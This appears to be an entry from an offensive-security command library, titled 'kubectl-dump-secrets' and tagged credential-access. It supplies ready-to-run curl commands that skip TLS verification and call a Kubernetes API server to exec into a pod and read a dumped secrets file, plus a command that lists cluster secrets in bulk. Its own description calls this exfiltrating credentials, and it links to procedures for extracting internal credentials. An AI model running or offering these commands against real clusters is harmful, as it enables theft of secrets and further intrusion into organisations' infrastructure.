---
data: >-
  curl -k
  https://<target-ip>:6443/api/v1/namespaces/default/pods/cred-dump-xxx/exec?command=cat&command=/tmp/secrets.yaml
tags:
  - credential-access
  - kubernetes
type: command
output: |-
  apiVersion: v1
  kind: Secret
  ...
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.625Z'
id: 592c7ffd-d187-42b6-b415-2b0083c031e7
verified: false
validated: true
submitted: true
---
# kubectl-dump-secrets

## Command

```bash
curl -k https://<target-ip>:6443/api/v1/namespaces/default/pods/cred-dump-xxx/exec?command=cat&command=/tmp/secrets.yaml
```

## Description

Executes into a pod to retrieve dumped secrets data, exfiltrating credentials stored in Kubernetes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure SSL | Yes |
| `?command=cat&command=/tmp/secrets.yaml` | Exec params to output file | Yes |

## Examples

### Basic Usage

```bash
curl -k https://<target-ip>:6443/api/v1/namespaces/default/pods/dump-pod/exec?command=cat&command=/tmp/output
```

### Advanced Usage

```bash
curl -k https://<target-ip>:6443/api/v1/secrets?limit=100
```

## Expected Output

YAML or JSON of secrets, including base64-encoded data.

## Related

- [[commands/kubectl-create-job-rce]]
- [[procedures/Extract-Internal-Credentials]]
